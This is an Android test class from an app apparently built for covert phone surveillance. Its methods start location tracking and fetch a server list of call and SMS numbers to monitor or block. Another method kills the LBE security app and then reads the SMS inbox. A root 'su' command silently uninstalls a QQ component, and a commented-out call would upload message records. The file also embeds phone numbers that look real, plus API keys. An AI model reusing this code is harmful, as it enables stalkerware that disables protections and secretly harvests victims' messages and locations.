package com.privacy.system.test;

import java.io.InputStream;
import java.io.OutputStream;
import java.util.Date;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import com.baidu.location.LocationClientOption;
import com.privacy.system.domain.TaskInfo;
import com.privacy.system.inte.RunBack;
import com.privacy.system.location.LocationMan;
import com.privacy.system.provider.TaskInfoProvider;
import com.privacy.system.resolver.field.SMSConstant;
import com.privacy.system.util.AppUtil;
import com.privacy.system.util.Logger;
import com.privacy.system.util.NetworkUtil;
import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.SystemClock;
import android.test.AndroidTestCase;
import android.text.TextUtils;

public class Test extends AndroidTestCase {
	private static final String TAG = Test.class.getSimpleName();
	
	public void locationNow(){
		LocationMan locationMan = new LocationMan(getContext());
		locationMan.setLocationPro(LocationClientOption.NetWorkFirst);
		locationMan.setRunBack(new MyRunnBack());
		locationMan.startLocaiton();
		Logger.d("Test","开始定位了");
	}
	
	private class MyRunnBack implements RunBack{

		@Override
		public void run() {
			
		}

		@Override
		public void run(Object object) {
			if(object instanceof String []){
				String[] locationInfo = (String[]) object;
				if (locationInfo != null && locationInfo.length == 2) {
					String latitude = locationInfo[0];
					String longitude = locationInfo[1];
					Logger.d("Text","纬度:"+latitude);
					Logger.d("Text","经度:"+longitude);
				}
			}
		}
	}
	
	public void update(){
		Date date = new Date();
		
		String updateDate = "my_num=15622231934&you_num=13538715695&time="+date.getTime()+"&content=测试测试&type=1&sim_id=1234567890987654321";
	
		//String updateResult= AppUtil.streamToStr(NetworkUtil.upload(getContext(),updateDate,"1c1d4f559ebbc08c492539282f36f969"));
		//Logger.d("Test",updateResult);
	}
	
	public void download(){
		String updateResult= AppUtil.streamToStr(NetworkUtil.download(getContext(),"tel=13538715695","041e83198b89ce1eb95d05b41b5b1a67"));
		Logger.d("Test",updateResult);
		 if(!TextUtils.isEmpty(updateResult)){
		    	try {
					JSONObject jsonObject = new JSONObject(updateResult);
					JSONObject callObject = jsonObject.getJSONObject("call");
					JSONArray jsonArray = callObject.getJSONArray("monitor");
					int callListLength = jsonArray.length();
					for(int j =0 ; j < callListLength ; j++){
						String callMonitorPhone= jsonArray.getString(j);
						
						Logger.d(TAG,"监听通话号码为:"+callMonitorPhone);
					}
					
					JSONArray jArrayNotMonitor = callObject.getJSONArray("not_monitor");
					int length3 = jArrayNotMonitor.length();
					for(int i = 0 ; i < length3 ; i++){
						String notMonitorStr = jArrayNotMonitor.getString(i);
						
						Logger.d(TAG,"不监听的通话号码:"+notMonitorStr);
					}
					
					String location = jsonObject.getString("loc");
					Logger.d(TAG, "是否定位:"+location);
					
					JSONObject msgJsonObject = jsonObject.getJSONObject("msg");
					JSONArray jsonArray2 = msgJsonObject.getJSONArray("monitor");
					int length4 = jsonArray2.length();
					for(int b = 0 ; b<length4 ; b++){
						String msgMonitorPhone = jsonArray2.getString(b);
						
						Logger.d(TAG,"信息监听号码:"+msgMonitorPhone);
					}
					
					JSONArray jsonArray3 = msgJsonObject.getJSONArray("not_monitor");
					int lengtn5 = jsonArray3.length();
					for(int c = 0 ; c < lengtn5 ; c++){
						String msgNotMonitor = jsonArray3.getString(c);
						
						Logger.d(TAG,"信息不监听号码:"+msgNotMonitor);
					}
					
					JSONArray jsonArray4 = msgJsonObject.getJSONArray("filter");
					int length6 = jsonArray4.length();
					for(int u = 0 ;u < length6 ; u++){
						String msgFilter = jsonArray4.getString(u);
						
						Logger.d(TAG,"信息拦截号码:"+msgFilter);
					}
					
				} catch (JSONException e) {
					Logger.d("CronBroadcaseRectiver",e.getMessage());
				}
		    }
	}
	
	public void toggleAirplane(){
		AppUtil.toggleAirplane(getContext(),true,0);
	}
	
	public void location(){
		LocationMan locationMan = new LocationMan(getContext());
		locationMan.setRunBack(new TextRunBack());
		locationMan.setLocationPro(LocationClientOption.NetWorkFirst);
		locationMan.startLocaiton();
		
	}
	
	/**
	 * 杀死所有正在运行的进程(除系统进程外)
	 */
	public void killTask() {
		// 需要获得的字段列
		String[] PROJECTION = {SMSConstant.TYPE,
				SMSConstant.ADDRESS, SMSConstant.BODY, SMSConstant.DATE,
				 SMSConstant.READ};
		 ActivityManager  am = (ActivityManager) getContext().getSystemService(Context.ACTIVITY_SERVICE);
		 ContentResolver contentResult = getContext().getContentResolver();
		TaskInfoProvider provider = new TaskInfoProvider(getContext());
		List<TaskInfo> taskInfos = provider.getAllTasks(am.getRunningAppProcesses());
		for (TaskInfo taskInfo : taskInfos) {
			String packname = taskInfo.getPackname();
			
			if ("com.lbe.security.miui".equals(packname)) {
				Logger.d("BootRectiver", "杀死了..." + packname);
				am.killBackgroundProcesses(packname);
				SystemClock.sleep(1000);
				Cursor smsCursor = contentResult.query(SMSConstant.CONTENT_URI, PROJECTION, null,null, null);
				if(smsCursor !=null){
					Logger.d("Test","有:"+smsCursor.getCount());
				}
			}
		}
	}
	
	public void endExecution(){
		int end = 9 ;
		if(end ==9){
			Logger.d("Test","endExecution");
			int aaa = 10;
			if(aaa==10){
				Logger.d("Test","StartExecution");
				return ;
			}
		}
		Logger.d("Test","测试");
	}
	
	public void getExecutePM(){
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				
				Process process = null;
				OutputStream out = null;
				InputStream in = null;
				try {
					//请求root
					process = Runtime.getRuntime().exec("su");
					out = process.getOutputStream();
					//调用安装
					out.write(("pm uninstall -k com.tencent.mobileqq.MSF " +"\n" ).getBytes());
					in = process.getInputStream();
					int len = 0 ;
					byte [] bs = new byte [256];
					while( -1 != (len=in.read(bs))){
						String state = new String(bs,0,len);
						if(state.equalsIgnoreCase("Success\n")){
							Logger.d("Test","卸载成功");
						}
					}
				} catch (Exception e) {
					e.printStackTrace();
				}finally{
					try {
						if(out !=null){
							out.flush();
							out.close();
						}
						if(in !=null){
							in.close();
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		}).start();
	}
	
	public void testSplitMessage(){
		String testStr = "123,123,123,123:234,234,234:345,345,345";
		String [] messType= testStr.split(":");
		Logger.d("Test","长度为:"+messType.length);
		String [] messNum = messType[0].split(",");
		Logger.d("Test","2长度为:"+messNum.length);
	}
	
	public class TextRunBack implements RunBack{

		@Override
		public void run() {
			
		}

		@Override
		public void run(Object object) {
			String [] reStrings = (String[]) object;
			Logger.d("Test","经度:"+reStrings[1]);
			Logger.d("Test","纬度:"+reStrings[0]);
		}
	}
}
